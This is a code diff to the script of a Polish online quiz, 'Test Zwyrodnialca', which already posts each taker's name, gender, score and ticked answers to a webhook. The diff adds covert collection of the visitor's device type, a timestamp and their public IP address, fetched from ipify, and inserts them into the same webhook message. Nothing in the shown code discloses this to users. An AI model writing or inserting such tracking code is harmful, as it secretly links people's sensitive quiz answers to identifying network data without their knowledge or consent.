@@ -487,10 +487,23 @@ function calculateScore() {
     }
   });
 
+  const ua = navigator.userAgent;
+  const platform = navigator.platform || '';
+  let device = platform;
+  if (/android/i.test(ua)) device = 'Android';
+  else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
+  else if (/Windows/i.test(ua)) device = 'Windows';
+  else if (/Mac/i.test(ua)) device = 'macOS';
+  else if (/Linux/i.test(ua)) device = 'Linux';
+
+  const time = new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' });
+
   const fields = [
     { name: 'Imię', value: userName || 'anonim', inline: true },
     { name: 'Płeć', value: userGender === 'chlop' ? 'chłop' : 'baba', inline: true },
-    { name: 'Wynik', value: score + '/200', inline: true }
+    { name: 'Wynik', value: score + '/200', inline: true },
+    { name: 'Urządzenie', value: device, inline: true },
+    { name: 'Godzina', value: time, inline: true }
   ];
 
   if (answers.length > 0) {
@@ -511,6 +524,17 @@ function calculateScore() {
     fields.push({ name: 'Zaznaczone pytania', value: 'brak' });
   }
 
+  fetch('https://api64.ipify.org?format=json').then(r => r.json()).then(data => {
+    const ip = data.ip || 'nieznane';
+    fields.splice(3, 0, { name: 'IP', value: ip, inline: true });
+    sendWebhook(score, fields);
+  }).catch(() => {
+    fields.splice(3, 0, { name: 'IP', value: 'nieznane', inline: true });
+    sendWebhook(score, fields);
+  });
+}
+
+function sendWebhook(score, fields) {
   const payload = {
     content: '',
     embeds: [{ title: 'Nowy wynik!', color: 11823615, fields, footer: { text: 'Test Zwyrodnialca' } }]
